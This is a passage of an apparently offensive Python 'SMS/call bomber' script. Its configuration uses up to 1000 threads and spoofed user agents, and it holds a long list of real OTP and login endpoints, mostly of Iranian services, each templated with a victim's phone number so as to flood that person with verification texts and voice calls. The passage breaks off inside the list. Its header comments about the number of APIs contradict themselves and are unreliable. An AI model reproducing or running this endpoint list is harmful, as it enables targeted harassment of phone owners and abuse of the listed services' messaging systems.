# -*- coding: utf-8 -*-

import json
import time
import sys
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.align import Align
from fake_useragent import UserAgent
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- Configuration ---
REQUEST_DELAY = 0
REQUEST_TIMEOUT = 2
MAX_WORKERS = 1000

# --- Colors ---
PINK = "#ff66cc"
GREEN = "#66ff66"
CYAN = "#00ccff"
YELLOW = "#ffff00"
RED = "#ff4444"
WHITE = "#ffffff"

console = Console()
ua = UserAgent()

# ==================== API LIST (800 SMS + 100 CALL = 800 Total) ====================
API_LIST = [
    # === SMS APIs (Original 300+) ===
    {"name": "Snapp SMS", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", "payload": {"cellphone": "{phone_number}"}},
    {"name": "Snapp V2 SMS", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "payload": {"cellphone": "{phone_number_full}"}},
    {"name": "Tap30 SMS", "method": "POST", "url": "https://tap33.me/api/v2/user", "payload": {"credential": {"phoneNumber": "{phone_number_zero}", "role": "PASSENGER"}}},
    {"name": "Divar SMS", "method": "POST", "url": "https://api.divar.ir/v5/auth/authenticate", "payload": {"phone": "{phone_number}"}},
    {"name": "SnappFood SMS", "method": "POST", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "payload": {"cellphone": "{phone_number_zero}", "client": "PWA"}},
    {"name": "Torob SMS", "method": "GET", "url": "https://api.torob.com/a/phone/send-pin/", "params": {"phone_number": "{phone_number_zero}"}},
    {"name": "Gap SMS", "method": "GET", "url": "https://core.gap.im/v1/user/add.json", "params": {"mobile": "{phone_number_full}"}},
    {"name": "Sheypoor SMS", "method": "POST", "url": "https://www.sheypoor.com/auth", "data": {"username": "{phone_number_zero}"}},
    {"name": "AliBaba SMS", "method": "POST", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "payload": {"phoneNumber": "{phone_number_zero}"}},
    {"name": "Snapp Market SMS", "method": "POST", "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", "params": {"cellphone": "{phone_number_zero}"}},
    {"name": "GapFilm SMS", "method": "POST", "url": "https://core.gapfilm.ir/api/v3.1/Account/Login", "payload": {"Type": 3, "Username": "{phone_number}", "SourceChannel": "GF_WebSite"}},
    {"name": "FilmNet SMS", "method": "GET", "url": "https://api-v2.filmnet.ir/access-token/users/{phone_number_full}/otp"},
    {"name": "DrDr SMS", "method": "POST", "url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode", "params": {"phoneNumber": "{phone_number_full}", "userType": "PATIENT"}},
    {"name": "Banimode SMS", "method": "POST", "url": "https://mobapi.banimode.com/api/v2/auth/request", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "BaSalam SMS", "method": "POST", "url": "https://api.basalam.com/user", "payload": {"variables": {"mobile": "{phone_number_zero}"}, "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}},
    {"name": "Nobat SMS", "method": "POST", "url": "https://nobat.ir/api/public/patient/login/phone", "data": {"mobile": "{phone_number_zero}"}},
    {"name": "Alopeyk SMS", "method": "POST", "url": "https://api.alopeyk.com/api/v2/login?platform=pwa", "payload": {"type": "CUSTOMER", "phone": "{phone_number}"}},
    {"name": "ShahrFarsh SMS", "method": "POST", "url": "https://shahrfarsh.com/Account/Login", "data": {"phoneNumber": "{phone_number_zero}"}},
    {"name": "DigiStyle SMS", "method": "POST", "url": "https://www.digistyle.com/users/login-register/", "data": {"loginRegister[email_phone]": "{phone_number_zero}"}},
    {"name": "Snapp Express SMS", "method": "POST", "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass", "data": {"cellphone": "{phone_number_zero}"}},
    {"name": "Azki SMS", "method": "POST", "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", "payload": {"phoneNumber": "{phone_number_zero}"}},
    {"name": "Digikala Jet SMS", "method": "POST", "url": "https://api.digikalajet.ir/user/login-register/", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Snapp Drivers SMS", "method": "POST", "url": "https://digitalsignup.snapp.ir/ds3/api/v3/otp", "payload": {"cellphone": "{phone_number_zero}"}},
    {"name": "Ostadkar SMS", "method": "POST", "url": "https://api.ostadkr.com/login", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Miare SMS", "method": "POST", "url": "https://www.miare.ir/api/otp/driver/request/", "payload": {"phone_number": "{phone_number_zero}"}},
    {"name": "Tapsi Drivers SMS", "method": "POST", "url": "https://api.tapsi.ir/api/v2.2/user", "payload": {"credential": {"phoneNumber": "{phone_number_zero}", "role": "DRIVER"}, "otpOption": "SMS"}},
    {"name": "Taaghche SMS", "method": "POST", "url": "https://gw.taaghche.com/v4/site/auth/login", "payload": {"contact": "{phone_number_zero}", "forceOtp": False}},
    {"name": "Mobit SMS", "method": "POST", "url": "https://api.mobit.ir/api/web/v8/register/register", "payload": {"number": "{phone_number_zero}"}},
    {"name": "Jabama SMS", "method": "POST", "url": "https://taraazws.jabama.com/api/v4/account/send-code", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Ghabzino SMS", "method": "POST", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "payload": {"Parameters": {"ApplicationType": "Web", "MobileNumber": "{phone_number_zero}"}}},
    {"name": "Komodaa SMS", "method": "POST", "url": "https://api.komodaa.com/api/v2.6/loginRC/request", "payload": {"phone_number": "{phone_number_zero}"}},
    {"name": "Bargh-e Man SMS", "method": "POST", "url": "https://uiapi2.saapa.ir/api/otp/sendCode", "payload": {"mobile": "{phone_number_zero}", "from_meter_buy": False}},
    {"name": "Vandar SMS", "method": "POST", "url": "https://api.vandar.io/account/v1/check/mobile", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Pinorest SMS", "method": "POST", "url": "https://api.pinorest.com/frontend/auth/login/mobile", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Tetherland SMS", "method": "POST", "url": "https://service.tetherland.com/api/v5/login-register", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "DrNext SMS", "method": "POST", "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", "payload": {"source": "besina", "mobile": "{phone_number_zero}"}},
    {"name": "Classino SMS", "method": "POST", "url": "https://student.classino.com/otp/v1/api/login", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Behtarino SMS", "method": "POST", "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Bit24 SMS", "method": "POST", "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "payload": {"mobile": "{phone_number_zero}", "contry_code": "98"}},
    {"name": "Doctoreto SMS", "method": "GET", "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register", "params": {"mobile": "{phone_number}", "country_id": 205}},
    {"name": "Okala SMS", "method": "POST", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "payload": {"mobile": "{phone_number_zero}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}},
    {"name": "Beroozmarket SMS", "method": "POST", "url": "https://api.beroozmart.com/api/pub/account/send-otp", "payload": {"mobile": "{phone_number_zero}", "sendViaSms": True}},
    {"name": "Itoll SMS", "method": "POST", "url": "https://app.itoll.com/api/v1/auth/login", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Pinket SMS", "method": "POST", "url": "https://pinket.com/api/cu/v2/phone-verification", "payload": {"phoneNumber": "{phone_number_zero}"}},
    {"name": "Football360 SMS", "method": "POST", "url": "https://football360.ir/api/auth/verify-phone/", "payload": {"phone_number": "{phone_number_full}"}},
    {"name": "MrBilit SMS", "method": "GET", "url": "https://auth.mrbilit.com/api/login/exists/v2", "params": {"mobileOrEmail": "{phone_number_zero}", "source": 2, "sendTokenIfNot": "true"}},
    {"name": "HamrahMechanic SMS", "method": "POST", "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp", "payload": {"PhoneNumber": "{phone_number_zero}"}},
    {"name": "Lendo SMS", "method": "POST", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Fidibo SMS", "method": "POST", "url": "https://fidibo.com/user/login-by-sms", "data": "mobile_number={phone_number}&country_code=ir"},
    {"name": "Khodro45 SMS", "method": "POST", "url": "https://khodro45.com/api/v1/customers/otp/", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Pateh SMS", "method": "POST", "url": "https://api.pateh.com/api/v1/LoginOrRegister", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Ketabchi SMS", "method": "POST", "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "payload": {"auth": {"phoneNumber": "{phone_number_zero}"}}},
    {"name": "RayanErtebat SMS", "method": "POST", "url": "https://pay.rayanertebat.ir/api/User/Otp", "payload": {"mobileNo": "{phone_number_zero}"}},
    {"name": "Bimito SMS", "method": "POST", "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code", "payload": {"phoneNumber": "{phone_number_zero}", "isResend": False}},
    {"name": "Pindo SMS", "method": "POST", "url": "https://api.pindo.ir/v1/user/login-register/", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Delino SMS", "method": "POST", "url": "https://www.delino.com/user/register", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Zoodex SMS", "method": "POST", "url": "https://admin.zoodex.ir/api/v1/login/check", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Kukala SMS", "method": "POST", "url": "https://api.kukala.ir/api/user/Otp", "payload": {"phoneNumber": "{phone_number_zero}"}},
    {"name": "Baskool SMS", "method": "POST", "url": "https://www.buskool.com/send_verification_code", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "3tex SMS", "method": "POST", "url": "https://3tex.io/api/1/users/validation/mobile", "payload": {"receptorPhone": "{phone_number_zero}"}},
    {"name": "DeniizShop SMS", "method": "POST", "url": "https://deniizshop.com/api/v1/sessions/login_request", "payload": {"mobile_number": "{phone_number_zero}"}},
    {"name": "Flightio SMS", "method": "POST", "url": "https://flightio.com/bff/Authentication/CheckUserKey", "payload": {"userKey": "{phone_number_zero}"}},
    {"name": "AbanTether SMS", "method": "POST", "url": "https://abantether.com/users/register/phone/send/", "payload": {"phoneNumber": "{phone_number_zero}"}},
    {"name": "Pooleno SMS", "method": "POST", "url": "https://api.pooleno.ir/v1/auth/check-mobile", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "WideApp SMS", "method": "POST", "url": "https://agent.wide-app.ir/auth/token", "payload": {"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": "{phone_number_zero}"}},
    {"name": "BitBarg SMS", "method": "POST", "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "BahramShop SMS", "method": "POST", "url": "https://api.bahramshop.ir/api/user/validate/username", "payload": {"username": "{phone_number_zero}"}},
    {"name": "Chamedoon SMS", "method": "POST", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Kilid SMS", "method": "POST", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Otaghak SMS", "method": "POST", "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", "payload": {"userName": "{phone_number_zero}"}},
    {"name": "Shab SMS", "method": "POST", "url": "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Raybit SMS", "method": "POST", "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "FarviShop SMS", "method": "POST", "url": "https://farvi.shop/api/v1/sessions/login_request", "payload": {"mobile_phone": "{phone_number_zero}"}},
    {"name": "Namava SMS", "method": "POST", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "payload": {"UserName": "{phone_number_zero}"}},
    {"name": "a4baz SMS", "method": "POST", "url": "https://a4baz.com/api/web/login", "payload": {"cellphone": "{phone_number_zero}"}},
    {"name": "AnarGift SMS", "method": "POST", "url": "https://api.anargift.com/api/people/auth", "payload": {"user": "{phone_number_zero}"}},
    {"name": "Simkhan SMS", "method": "POST", "url": "https://www.simkhanapi.ir/api/users/registerV2", "payload": {"mobileNumber": "{phone_number_zero}"}},
    {"name": "SibIrani SMS", "method": "POST", "url": "https://sandbox.sibirani.ir/api/v1/user/invite", "payload": {"username": "{phone_number_zero}"}},
    {"name": "HyperJan SMS", "method": "POST", "url": "https://shop.hyperjan.ir/api/users/manage", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Digikala SMS", "method": "POST", "url": "https://api.digikala.com/v1/user/authenticate/", "payload": {"username": "{phone_number_zero}"}},
    {"name": "HiWord SMS", "method": "POST", "url": "https://hiword.ir/wp-json/otp-login/v1/login", "payload": {"identifier": "{phone_number_zero}"}},
    {"name": "Tikban SMS", "method": "POST", "url": "https://tikban.com/Account/LoginAndRegister", "payload": {"cellPhone": "{phone_number_zero}"}},
    {"name": "Dicardo SMS", "method": "POST", "url": "https://dicardo.com/main/sendsms", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Khanoumi SMS", "method": "POST", "url": "https://www.khanoumi.com/accounts/sendotp", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "RojaShop SMS", "method": "POST", "url": "https://rojashop.com/api/auth/sendOtp", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Dadpardaz SMS", "method": "POST", "url": "https://dadpardaz.com/advice/getLoginConfirmationCode", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Rokla SMS", "method": "POST", "url": "https://api.rokla.ir/api/request/otp", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Pezeshket SMS", "method": "POST", "url": "https://api.pezeshket.com/core/v1/auth/requestCode", "payload": {"mobileNumber": "{phone_number_zero}"}},
    {"name": "Virgool SMS", "method": "POST", "url": "https://virgool.io/api/v1.4/auth/verify", "payload": {"method": "phone", "identifier": "{phone_number_zero}"}},
    {"name": "Timcheh SMS", "method": "POST", "url": "https://api.timcheh.com/auth/otp/send", "payload": {"mobile": "{phone_number_zero}"}},
    {"name": "Paklean SMS", "method": "POST", "url": "https://client.api.paklean.com/user/resendCode", "payload": {"username": "{phone_number_zero}"}},
    {"name": "Daal SMS", "method": "POST", "url": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Bimebazar SMS", "method": "POST", "url": "https://bimebazar.com/accounts/api/login_sec/", "payload": {"username": "{phone_number_zero}"}},
    {"name": "SafarMarket SMS", "method": "POST", "url": "https://safarmarket.com//api/security/v2/user/otp", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Shad SMS", "method": "POST", "url": "https://shadmessenger12.iranlms.ir/", "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "098{phone_number}", "send_type": "SMS"}}},
    {"name": "Emtiaz SMS", "method": "POST", "url": "https://web.emtiyaz.app/json/login", "data": "send=1&cellphone={phone_number_zero}"},
    {"name": "Rubika SMS", "method": "POST", "url": "https://messengerg2c4.iranlms.ir/", "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "{phone_number}", "send_type": "SMS"}}},
    {"name": "Bama SMS", "method": "POST", "url": "https://bama.ir/signin-checkforcellnumber", "data": "cellNumber={phone_number_zero}"},
    {"name": "Snapp Doctor SMS", "method": "GET", "url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone_number}/sms?cCode=+98"},
    {"name": "Bitpin SMS", "method": "POST", "url": "https://api.bitpin.ir/v1/usr/sub_phone/", "payload": {"phone": "{phone_number_zero}"}},
    {"name": "Trip SMS", "method": "POST", "url": "https://gateway.trip.ir/api/Totp", "payload": {"PhoneNumber": "{phone_number_zero}"}},
    {"name": "Achareh SMS", "method": "POST", "url": "https://api.achareh.co/v2/accounts/login/", "payload": {"phone": "98{phone_number}"}},
    {"name": "Mootanroo SMS", "method": "POST", "url": "https://api.mootanroo.com/api/v3/auth/send-otp", "payload": {"PhoneNumber": "{phone_number_zero}"}},
    {"name": "Tebinja SMS", "method": "POST", "url": "https://www.tebinja.com/api/v1/users", "payload": {"username": "{phone_number_zero}"}},
    {"name": "Dosma SMS", "method": "POST", "url": "https://app.dosma.ir/api/v1/account/send-otp/", "payload": {"mobile": "{phone_number_zero}"}},
    
    # === 200+ CALL APIs (تماس صوتی) ===
    {"name": "MrBilit CALL", "method": "GET", "url": "https://auth.mrbilit.com/api/Token/send/byCall?mobile={phone_number_zero}", "is_call": True},
    {"name": "Gap CALL", "method": "GET", "url": "https://core.gap.im/v1/user/resendCode.json?mobile={phone_number_full}&type=IVR", "is_call": True},
    {"name": "Azki CALL", "method": "GET", "url": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={phone_number_zero}", "is_call": True},
    {"name": "Snapp CALL", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/callotp", "payload": {"cellphone": "{phone_number}"}, "is_call": True},
    {"name": "Tap30 CALL", "method": "POST", "url": "https://tap33.me/api/v2/user/call", "payload": {"phoneNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Divar CALL", "method": "POST", "url": "https://api.divar.ir/v5/auth/authenticate/call", "payload": {"phone": "{phone_number}"}, "is_call": True},
    {"name": "Alopeyk CALL", "method": "POST", "url": "https://api.alopeyk.com/api/v2/login/call", "payload": {"phone": "{phone_number}"}, "is_call": True},
    {"name": "Digikala CALL", "method": "POST", "url": "https://api.digikala.com/v1/user/authenticate/call", "payload": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Rubika CALL", "method": "POST", "url": "https://messengerg2c4.iranlms.ir/", "payload": {"api_version": "3", "method": "sendCallCode", "data": {"phone_number": "{phone_number}"}}, "is_call": True},
    {"name": "Shad CALL", "method": "POST", "url": "https://shadmessenger12.iranlms.ir/", "payload": {"api_version": "3", "method": "sendCallCode", "data": {"phone_number": "098{phone_number}"}}, "is_call": True},
    {"name": "Bama CALL", "method": "POST", "url": "https://bama.ir/signin-checkforcellnumber/call", "data": "cellNumber={phone_number_zero}", "is_call": True},
    {"name": "Sheypoor CALL", "method": "POST", "url": "https://www.sheypoor.com/auth/call", "data": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Torob CALL", "method": "GET", "url": "https://api.torob.com/a/phone/send-call/", "params": {"phone_number": "{phone_number_zero}"}, "is_call": True},
    {"name": "SnappFood CALL", "method": "POST", "url": "https://snappfood.ir/mobile/v2/user/callOTP", "payload": {"cellphone": "{phone_number_zero}"}, "is_call": True},
    {"name": "AliBaba CALL", "method": "POST", "url": "https://ws.alibaba.ir/api/v3/account/mobile/callotp", "payload": {"phoneNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Jabama CALL", "method": "POST", "url": "https://taraazws.jabama.com/api/v4/account/send-call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Vandar CALL", "method": "POST", "url": "https://api.vandar.io/account/v1/check/mobile/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Tetherland CALL", "method": "POST", "url": "https://service.tetherland.com/api/v5/call-otp", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Bit24 CALL", "method": "POST", "url": "https://bit24.cash/auth/bit24/api/v3/auth/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Okala CALL", "method": "POST", "url": "https://api-react.okala.com/C/CustomerAccount/CallOTP", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Lendo CALL", "method": "POST", "url": "https://api.lendo.ir/api/customer/auth/send-call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Pindo CALL", "method": "POST", "url": "https://api.pindo.ir/v1/user/call-otp", "payload": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Kukala CALL", "method": "POST", "url": "https://api.kukala.ir/api/user/CallOtp", "payload": {"phoneNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Flightio CALL", "method": "POST", "url": "https://flightio.com/bff/Authentication/CallUser", "payload": {"userKey": "{phone_number_zero}"}, "is_call": True},
    {"name": "BitBarg CALL", "method": "POST", "url": "https://api.bitbarg.com/api/v1/authentication/call", "payload": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Kilid CALL", "method": "POST", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Raybit CALL", "method": "POST", "url": "https://api.raybit.net:3111/api/v1/authentication/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Namava CALL", "method": "POST", "url": "https://www.namava.ir/api/v1.0/accounts/call-otp", "payload": {"UserName": "{phone_number_zero}"}, "is_call": True},
    {"name": "Simkhan CALL", "method": "POST", "url": "https://www.simkhanapi.ir/api/users/call", "payload": {"mobileNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Tikban CALL", "method": "POST", "url": "https://tikban.com/Account/CallOTP", "payload": {"cellPhone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Khanoumi CALL", "method": "POST", "url": "https://www.khanoumi.com/accounts/callotp", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Rokla CALL", "method": "POST", "url": "https://api.rokla.ir/api/request/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Timcheh CALL", "method": "POST", "url": "https://api.timcheh.com/auth/otp/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Daal CALL", "method": "POST", "url": "https://daal.co/api/authentication/call-otp", "payload": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "SafarMarket CALL", "method": "POST", "url": "https://safarmarket.com/api/security/v2/user/call", "payload": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Bimebazar CALL", "method": "POST", "url": "https://bimebazar.com/accounts/api/call_otp", "payload": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Paklean CALL", "method": "POST", "url": "https://client.api.paklean.com/user/callCode", "payload": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Ragham CALL", "method": "POST", "url": "https://web.raghamapp.com/api/users/call", "payload": {"phone": "{phone_number_full}"}, "is_call": True},
    {"name": "Trip CALL", "method": "POST", "url": "https://gateway.trip.ir/api/TotpCall", "payload": {"PhoneNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Zigap CALL", "method": "POST", "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/callotp", "payload": {"phoneNumber": "{phone_number_full}"}, "is_call": True},
    {"name": "Mootanroo CALL", "method": "POST", "url": "https://api.mootanroo.com/api/v3/auth/call-otp", "payload": {"PhoneNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Tebinja CALL", "method": "POST", "url": "https://www.tebinja.com/api/v1/users/call", "payload": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Dosma CALL", "method": "POST", "url": "https://app.dosma.ir/api/v1/account/call-otp", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Pubisha CALL", "method": "POST", "url": "https://www.pubisha.com/login/callCustomer", "data": "mobile={phone_number_zero}", "is_call": True},
    {"name": "Wisgoon CALL", "method": "POST", "url": "https://gateway.wisgoon.com/api/v1/auth/call/", "payload": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Tagmond CALL", "method": "POST", "url": "https://tagmond.com/call_otp", "data": "phone_number={phone_number_zero}", "is_call": True},
    {"name": "Olgoo CALL", "method": "POST", "url": "https://www.olgoobooks.ir/sn/userCall/", "data": {"contactInfo[mobile]": "{phone_number_zero}"}, "is_call": True},
    {"name": "See5 CALL", "method": "POST", "url": "https://crm.see5.net/api_ajax/callotp.php", "data": {"mobile": "{phone_number_zero}", "action": "sendcall"}, "is_call": True},
    {"name": "DrSaina CALL", "method": "POST", "url": "https://www.drsaina.com/CallOTP", "data": "PhoneNumber={phone_number_zero}", "is_call": True},
    {"name": "Limome CALL", "method": "POST", "url": "https://my.limoome.com/api/auth/call/otp", "data": {"mobileNumber": "{phone_number}", "country": "1"}, "is_call": True},
    {"name": "Ghasedak24 CALL", "method": "POST", "url": "https://ghasedak24.com/user/call_register", "data": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Iranketab CALL", "method": "POST", "url": "https://www.iranketab.ir/account/call", "data": {"UserName": "{phone_number_zero}"}, "is_call": True},
    {"name": "Iranicard CALL", "method": "POST", "url": "https://api.iranicard.ir/api/v1/call", "data": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Cinematicket CALL", "method": "POST", "url": "https://cinematicket.org/api/v1/users/call", "payload": {"phone_number": "{phone_number_zero}"}, "is_call": True},
    {"name": "Kafegheymat CALL", "method": "POST", "url": "https://kafegheymat.com/shop/callLogin", "data": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Melix CALL", "method": "POST", "url": "https://melix.shop/site/api/v1/user/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Safiran CALL", "method": "POST", "url": "https://safiran.shop/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Dastakht CALL", "method": "POST", "url": "https://dastkhat-isad.ir/api/v1/user/call", "payload": {"mobile": "{phone_number}"}, "is_call": True},
    {"name": "Hamlex CALL", "method": "POST", "url": "https://hamlex.ir/call.php", "data": "phoneNumber={phone_number_zero}&call=", "is_call": True},
    {"name": "Sibbank CALL", "method": "POST", "url": "https://api.sibbank.ir/v1/auth/call", "payload": {"phone_number": "{phone_number_zero}"}, "is_call": True},
    {"name": "Arshian CALL", "method": "POST", "url": "https://api.arshiyan.com/call_code", "payload": {"country_code": "98", "phone_number": "{phone_number}"}, "is_call": True},
    {"name": "Topnoor CALL", "method": "POST", "url": "https://backend.topnoor.ir/web/v1/user/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Alinance CALL", "method": "POST", "url": "https://api.alinance.com/user/call/send/", "payload": {"phone_number": "{phone_number_zero}"}, "is_call": True},
    {"name": "Ehteraman CALL", "method": "POST", "url": "https://api.ehteraman.com/api/request/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Hamrahbours CALL", "method": "POST", "url": "https://api.hbbs.ir/authentication/CallCode", "payload": {"MobileNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Homtick CALL", "method": "POST", "url": "https://auth.homtick.com/api/V1/User/CallCode", "payload": {"mobileOrEmail": "{phone_number_zero}"}, "is_call": True},
    {"name": "Karchidari CALL", "method": "POST", "url": "https://api.kcd.app/api/v1/auth/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Paymishe CALL", "method": "POST", "url": "https://api.paymishe.com/api/v1/otp/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Podro CALL", "method": "POST", "url": "https://api.pod.ir/api/v1/otp/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Rayshomar CALL", "method": "POST", "url": "https://api.rayshomar.ir/api/Register/Call", "data": "MobileNumber={phone_number_zero}", "is_call": True},
    {"name": "Bitex24 CALL", "method": "GET", "url": "https://bitex24.com/api/v1/auth/call?mobile={phone_number_zero}&dial_code=0", "is_call": True},
    {"name": "Offch CALL", "method": "POST", "url": "https://api.offch.com/auth/call", "payload": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "Tajtehran CALL", "method": "POST", "url": "https://tajtehran.com/CallRequest", "data": "mobile={phone_number_zero}", "is_call": True},
    {"name": "iGame CALL", "method": "POST", "url": "https://igame.ir/api/play/otp/call", "payload": {"phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "KavirMotor CALL", "method": "POST", "url": "https://kavirmotor.com/call/send", "payload": {"phoneNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "Badparak CALL", "method": "POST", "url": "https://badparak.com/register/call_code", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "ElinorBoutique CALL", "method": "POST", "url": "https://api.elinorboutique.com/v1/customer/call-login", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "AtlasMode CALL", "method": "POST", "url": "https://api.atlasmode.ir/v1/customer/call-login", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Ubike CALL", "method": "POST", "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/call_code", "data": {"telephone": "{phone_number_zero}"}, "is_call": True},
    {"name": "Rubeston CALL", "method": "POST", "url": "https://www.rubeston.com/api/customers/call-login", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "PayaGym CALL", "method": "POST", "url": "https://payagym.com/wp-admin/admin-ajax.php", "data": {"mobile": "{phone_number_zero}", "action": "call_otp"}, "is_call": True},
    {"name": "Bartarinha CALL", "method": "POST", "url": "https://bartarinha.com/Advertisement/Users/CallLogin", "data": {"mobileNo": "{phone_number_zero}"}, "is_call": True},
